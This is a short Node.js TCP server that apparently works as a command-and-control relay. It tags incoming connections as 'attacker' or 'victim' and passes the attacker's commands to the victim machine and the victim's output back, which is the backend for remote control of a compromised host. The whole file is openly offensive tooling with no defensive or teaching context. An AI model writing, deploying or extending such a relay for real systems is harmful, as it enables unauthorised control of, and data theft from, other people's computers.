import { createServer } from "net";

// Server configuration
const SERVER_PORT = 4000;
var victimSocket;
var attackerSocket;

// Create a TCP server
const server = createServer((socket) => {
  console.log(
    `[*] connected from ${socket.remoteAddress}:${socket.remotePort}`
  );

  // Handle incoming data from the attacker
  socket.on("data", (data) => {
    const command = data.toString('utf8').trim();
    if (command.startsWith("_attacker_")) {
      console.log(`Received command from attacker: ${command}`);
      attackerSocket = socket;
      try {
        const sendMessage = data.slice(10);
        victimSocket.write(sendMessage);        
      } catch (error) {
        console.log("error: cannot send message to the victim");
      }
    } else if (command.startsWith("_victim_")) {
      console.log(`Received message from victim: ${command}`);
      victimSocket = socket;
      try {
        const sendMessage = data.slice(8);
        attackerSocket.write(sendMessage);        
      } catch (error) {
        console.log("error: cannot send message to the attacker");
      }
    } else {
      console.log(`Received command from someone else: ${command}`);
    }

    // Simulate sending response back to attacker
    // socket.write("Command received and executed successfully\r\n");
  });

  // Handle socket close
  socket.on("close", () => {
    console.log(`[*] Attacker connection closed`);
  });

  // Handle socket error
  socket.on("error", (err) => {
    console.error(`[!] Socket error: ${err.message}`);
  });
});

const PORT = process.env.PORT || SERVER_PORT;
// Start listening for incoming connections
server.listen(SERVER_PORT, () => {
  console.log(`[*] Server listening on port ${PORT}`);
});
